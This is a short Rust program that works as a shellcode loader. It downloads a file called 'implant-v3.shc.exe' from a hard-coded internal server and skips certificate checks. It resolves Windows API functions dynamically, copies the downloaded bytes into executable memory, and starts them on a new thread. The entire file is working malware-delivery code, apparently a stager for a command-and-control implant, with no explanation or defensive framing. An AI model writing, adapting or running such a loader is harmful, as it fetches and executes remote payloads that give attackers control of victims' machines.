use std::ptr::{null, null_mut};
use std::ffi::c_void;
use libloading::Library;
fn main() {
    std::env::set_var("RUST_BACKTRACE", "1");

    let base_url = "https://192.168.2.165";
    // First need to get the file from the server
    let file_url = base_url.to_owned() + "/recipes/download/implant-v3.shc.exe";

    let client = reqwest::blocking::ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let file_response = client
        .get(file_url)
        .send()
        .unwrap();



    let raw_file: Vec<u8> = file_response.bytes().unwrap().into();

    let file_bytes: &[u8] = &raw_file;
    let file_size = file_bytes.len();

    let mut old_perms = 0x4;

    unsafe {
        let kernel32 = Library::new("kernel32.dll").unwrap();
    let ntdll = Library::new("ntdll.dll").unwrap();

    let virtual_alloc: libloading::Symbol<
    unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
> = kernel32.get(b"VirtualAlloc\0").unwrap();
    let rtl_move_memory: libloading::Symbol<
    unsafe extern "C" fn(*mut c_void, *const c_void, usize),
> = ntdll.get(b"RtlMoveMemory\0").unwrap();
    let create_thread: libloading::Symbol<
    unsafe extern "C" fn(
        *const c_void,
        usize,
        *const c_void,
        *const c_void,
        u32,
        *mut u32,
    ) -> isize,
> = kernel32.get(b"CreateThread\0").unwrap();

    // RWX by default, allocate, copy, execute
    // Allocate some RWX
    let PAGE_EXECUTE_READWRITE = 0x40;
    let MEM_COMMIT = 0x1000;
    let MEM_RESERVE = 0x2000;
    let dest = virtual_alloc(
        null(),
        file_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    // Copy the shellcode in there
    rtl_move_memory(dest, file_bytes.as_ptr().cast(), file_size);
    // Run the shellcode
    let handle = create_thread(null(), 0, dest, null(), 0, null_mut());
    }

    loop {
        std::thread::sleep(std::time::Duration::from_secs(10));
    }

}
